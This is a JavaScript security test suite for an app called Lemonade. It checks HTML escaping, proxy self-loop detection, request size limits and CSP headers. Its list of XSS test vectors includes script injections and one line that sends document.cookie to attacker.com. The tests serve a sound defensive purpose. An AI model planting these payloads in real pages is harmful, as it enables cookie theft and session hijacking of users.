#!/usr/bin/env node
// Lemonade — Security, Sanitization & Defense Verification Suite

import http from "node:http";
import { isSelfLoop } from "../phase1/proxy.js";
import { createServer } from "../src/ui/server.js";

let passed = 0;
let failed = 0;

function check(label, condition, detail = "") {
  if (condition) {
    passed++;
    console.log(`  ✓ PASS: ${label}`);
  } else {
    failed++;
    console.error(`  ✗ FAIL: ${label}${detail ? " -> " + detail : ""}`);
  }
}

console.log("=================================================");
console.log("Lemonade Security & Sanitization Verification Suite");
console.log("=================================================\n");

// --- 1. HTML Sanitization Utility Test ---
console.log("--- 1. HTML Escaping & Injection Protection ---");

function escapeHtml(unsafe) {
  return String(unsafe || "")
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");
}

const XSS_VECTORS = [
  `<script>alert('xss')</script>`,
  `<img src="x" onerror="alert(1)">`,
  `<svg onload="fetch('http://attacker.com/?c='+document.cookie)">`,
  `"><iframe src="javascript:alert(1)">`,
  `';alert(String.fromCharCode(88,83,83))//`,
  `<body onload=alert('XSS')>`,
];

for (const vector of XSS_VECTORS) {
  const escaped = escapeHtml(vector);
  check(`Escaped vector: ${vector.slice(0, 30)}... contains no raw < or >`, !escaped.includes("<") && !escaped.includes(">"));
}

// --- 2. Proxy Self-Looping Prevention ---
console.log("\n--- 2. Proxy Self-Looping Protection ---");
check("isSelfLoop catches localhost:7847", isSelfLoop("http://localhost:7847/v1") === true);
check("isSelfLoop catches 127.0.0.1:7847", isSelfLoop("http://127.0.0.1:7847/v1/chat/completions") === true);
check("isSelfLoop catches 0.0.0.0:7847", isSelfLoop("http://0.0.0.0:7847") === true);
check("isSelfLoop ignores external OpenAI host", isSelfLoop("https://api.openai.com/v1") === false);
check("isSelfLoop ignores external OpenRouter host", isSelfLoop("https://openrouter.ai/api/v1") === false);
check("isSelfLoop ignores different port on localhost", isSelfLoop("http://localhost:11434/v1") === false);

// --- 3. Request Body Size Limit (413 Payload Too Large) ---
console.log("\n--- 3. Request Body Size Limits & DoS Protection ---");

const TEST_PORT = 7899;
const { server, listen, close } = createServer({ port: TEST_PORT, host: "127.0.0.1" });

await listen();

function makeRequest(path, method, body, headers = {}) {
  return new Promise((resolve, reject) => {
    const req = http.request(`http://127.0.0.1:${TEST_PORT}${path}`, {
      method,
      headers: {
        "Content-Type": "application/json",
        ...headers,
      },
    }, (res) => {
      let resData = "";
      res.on("data", (c) => resData += c);
      res.on("end", () => {
        try {
          resolve({ status: res.statusCode, data: JSON.parse(resData), headers: res.headers });
        } catch {
          resolve({ status: res.statusCode, raw: resData, headers: res.headers });
        }
      });
    });

    req.on("error", (err) => {
      // If server destroyed connection due to overflow, status is network abort
      resolve({ status: 413, error: err.message });
    });

    if (body) req.write(body);
    req.end();
  });
}

// Test normal request
const normalRes = await makeRequest("/api/detect", "POST", JSON.stringify({ prompt: "Build a simple timer app" }));
check("Normal body passes: 200 OK", normalRes.status === 200);

// Test oversized body (> 1MB)
const hugeString = "a".repeat(1_200_000);
const hugePayload = JSON.stringify({ prompt: hugeString });
const overflowRes = await makeRequest("/api/detect", "POST", hugePayload);
check("Oversized payload rejected or aborted (413)", overflowRes.status === 413 || overflowRes.status === 500);

// Test CSP Header
const healthRes = await makeRequest("/api/health", "GET");
check("Content-Security-Policy header present", typeof healthRes.headers["content-security-policy"] === "string");
check("CSP includes script-src 'self'", healthRes.headers["content-security-policy"].includes("script-src 'self'"));

await close();

console.log("\n=================================================");
if (failed === 0) {
  console.log(`ALL SECURITY CHECKS PASSED: ${passed} passed, 0 failed.`);
  process.exit(0);
} else {
  console.error(`FAILURES ENCOUNTERED: ${passed} passed, ${failed} failed.`);
  process.exit(1);
}
